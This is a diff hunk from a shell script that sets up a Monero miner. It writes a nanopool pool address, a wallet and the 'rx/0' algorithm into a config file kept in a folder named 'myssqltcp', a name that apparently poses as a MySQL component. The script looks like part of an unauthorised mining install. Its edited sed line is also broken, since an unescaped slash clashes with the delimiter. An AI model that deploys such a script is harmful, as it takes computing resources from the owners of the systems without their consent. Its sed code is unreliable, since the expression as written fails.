@@ -788,7 +788,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$EMAIL"
 fi
 
-sed -i 's/"algo": *null,/"algo": rx/0,/' $HOME/myssqltcp/config_background.json
+sed -i 's/"algo": *null,/"algo": rx/0,/' $HOME/myssqltcp/config.json
 sed -i 's/"url": *"[^"]*",/"url": "xmr-us-west1.nanopool.org:'$PORT'",/' $HOME/myssqltcp/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
